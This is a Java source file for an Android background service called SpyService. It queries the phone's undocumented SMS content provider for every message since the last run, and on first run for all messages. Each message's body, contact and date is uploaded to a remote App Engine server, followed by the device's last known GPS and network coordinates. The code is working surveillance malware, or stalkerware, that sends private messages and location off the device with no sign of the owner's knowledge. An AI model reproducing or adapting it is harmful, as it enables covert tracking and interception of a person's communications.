package com.prestomation.android.sospy.spy;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.location.LocationProvider;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;

public class SpyService extends Service {

	private static final String SMS_RECEIVED_TITLE = "SMS from ";
	private static final String SMS_SENT_TITLE = "SMS to ";
	private static final Uri SMS_URI = Uri.parse("content://sms"); // <--- This
																	// is not a
																	// public
																	// api
	private static final String[] SMS_COLUMNS = { "_id", "date", "body", "address", "protocol" };
	private static final String PREF_LAST_SMS_DATE = "smsDate";

	@Override
	public void onCreate() {

		Log.i(SetupActivity.TAG, "Starting SpyService..");

	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// WARNING: We are using a non-public api for getting SMS. This is
		// unsupported and may not work on future/other versions of Android
		// It is virtually impossible to get sent SMS in all cases, code would
		// need to be written specifically for every SMS client

		final SharedPreferences prefs = Prefs.get(this);
		SharedPreferences.Editor prefsEdit = prefs.edit();

		// Wait 10 seconds to make sure the sms content provider has stabilized.
		try {
			Thread.sleep(10000);
		} catch (InterruptedException e) {
			// pass, if we get interrupted...so what?
		}

		String currentTime = String.valueOf(System.currentTimeMillis());
		Log.i(SetupActivity.TAG, "Current Time: " + currentTime);

		// On first run, this default value will cause EVERY SMS to be
		// transmitted to server
		String lastDate = prefs.getString(PREF_LAST_SMS_DATE, "1");

		Log.i(SetupActivity.TAG, "lastDate: " + lastDate);

		// Get all SMS that have happened since our remembered date
		final Cursor cursor = getContentResolver().query(SMS_URI, SMS_COLUMNS, "date > ?",
				new String[] { lastDate }, null);
		Log.i(SetupActivity.TAG, cursor.getCount() + " texts since last run");

		prefsEdit.putString(PREF_LAST_SMS_DATE, currentTime);
		prefsEdit.commit();

		//Gety location information
		final LocationManager locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
		
		// Do the actual work in a worker thread. We don't want to tie up
		// onStartCommand as this can tie up on UI/prompt a force close
		new Thread(new Runnable() {
			public void run() {

				if (cursor.moveToFirst()) 
				{

					do {
						// Iterate through all SMS since the last run and report
						// them up
						// to the SOSpyer service
						String body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
								.toString();
						String address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
								.toString();
						String date = cursor.getString(cursor.getColumnIndexOrThrow("date"))
								.toString();
						Log.i(SetupActivity.TAG, "Date: " + date);

						String protocol = cursor
								.getString(cursor.getColumnIndexOrThrow("protocol"));

						String devID = prefs.getString(SetupActivity.PREF_DEVICE_ID, null);
						String contact = ContactsUtility.getPhoneNumber(getContentResolver(),
								address);
						AppEngineClient client = new AppEngineClient(devID);
						String title;
						if (protocol == null) {
							title = SMS_SENT_TITLE;
						} else {
							title = SMS_RECEIVED_TITLE;
						}
						title += contact;
						client.sendSpyData(title, body, date);
					} while (cursor.moveToNext());
				}
				Log.i(SetupActivity.TAG, "Finished sending SMS");
				
				//setup the client
				String devID = prefs.getString(SetupActivity.PREF_DEVICE_ID, null);
				AppEngineClient client = new AppEngineClient(devID);
				
				//Send out the GPS Locations
				Location gpsLocation = locationManager.getLastKnownLocation("gps");

				if(gpsLocation != null)
				{
					String title = "GPS Location";
					String body = "Latitue: " + gpsLocation.getLatitude() + "  Longitude: " + gpsLocation.getLongitude();
					String date = "";
					
					client.sendSpyData(title, body, date);
				}
				
				//Send out the network location
				Location networkLocation = locationManager.getLastKnownLocation("network");
				
				if(networkLocation != null)
				{
					String title = "Network Location";
					String body = "Latitue: " + networkLocation.getLatitude() + "  Longitude: " + networkLocation.getLongitude();
					String date = "";
					
					client.sendSpyData(title, body, date);
				}
				
			}
		}).start();

		return START_NOT_STICKY;

	}

	@Override
	public void onDestroy() {
		Log.i(SetupActivity.TAG, "Destroy SmsService activity");
	}

	@Override
	public IBinder onBind(Intent intent) {
		// We don't bind in this app
		return null;
	}
}
